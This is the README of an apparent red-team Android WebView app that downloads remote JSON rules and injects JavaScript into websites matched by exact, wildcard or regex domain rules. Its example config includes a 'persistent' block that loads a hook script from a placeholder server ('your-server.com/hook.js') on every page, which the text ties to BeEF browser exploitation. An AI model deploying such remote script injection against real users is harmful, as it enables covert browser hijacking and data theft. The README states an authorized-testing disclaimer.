# 🚀 WebView JavaScript Injector

This project is an **Android WebView app** that injects **custom JavaScript** into websites based on their **domain**, using **wildcards** and **regular expressions (regex)**. The JavaScript rules are stored in a remote JSON file.

---

## 🔹 How It Works

1. The app **downloads `app.json`** from a remote server.
2. It **extracts the domain** of the website being loaded.
3. It **checks the JSON file** for JavaScript rules matching the domain using:
   - ✅ **Exact match** (`b.com`)
   - ✅ **Wildcard match** (`*.example.com`)
   - ✅ **Regex match** (`regex:^.*\.secure\d+\.com$`)
   - ✅ **Default fallback** (if no match is found)
   - ✅ **Persistent scripts**  (optional: run on all pages if enabled useful for BeEF Hook)
4. The matching JavaScript is **injected into the WebView** using `evaluateJavascript()`.
5. When a user **navigates to another page**, the process repeats, injecting JavaScript for the new site.

---

## 📂 Example of Matching

| URL Loaded                   | Matched Rule                  | JavaScript Injected        |
|------------------------------|------------------------------|---------------------------|
| `https://api.example.com`    | `*.example.com`              | ✅ Wildcard matched       |
| `https://login.secure123.com` | `regex:^.*\.secure\d+\.com$` | ✅ Regex matched         |
| `https://b.com`              | `b.com`                      | ✅ Exact match           |
| `https://randomsite.com`     | `default`                    | ✅ Default script        |

---

## 📂 Example `app.json`

```json
{
    "url": "https://a.com",
    "websites": {
        "*.example.com": {
            "scripts": [
                "alert('Wildcard matched for example.com subdomains!');"
            ]
        },
        "regex:^.*\\.secure\\d+\\.com$": {
            "scripts": [
                "alert('Regex matched for secureX.com domains!');"
            ]
        },
        "b.com": {
            "scripts": [
                "alert('Welcome to B.com!');",
                "document.body.style.backgroundColor = 'blue';"
            ]
        }
    },
    "default": {
        "scripts": [
            "alert('No custom script for this site.');"
        ]
    },
    "persistent": {
         "scripts": [
            "var script = document.createElement('script');",
            "script.src = 'http://your-server.com/hook.js';",
            "document.head.appendChild(script);"
        ],
        "status": false
    }
}

## ⚠️ Legal & Ethical Disclaimer

🚨 This tool is developed strictly for educational and authorized security testing purposes only.

🔬 It is intended to help cybersecurity professionals, researchers, and enthusiasts understand post-exploitation, red teaming, and detection techniques in lab or controlled environments.

❌ Do NOT use this tool on any system or network without explicit permission. Unauthorized use may be illegal and unethical.

🛡 The author takes no responsibility for any misuse or damage caused by this project.

---

> Always hack responsibly. 💻🔐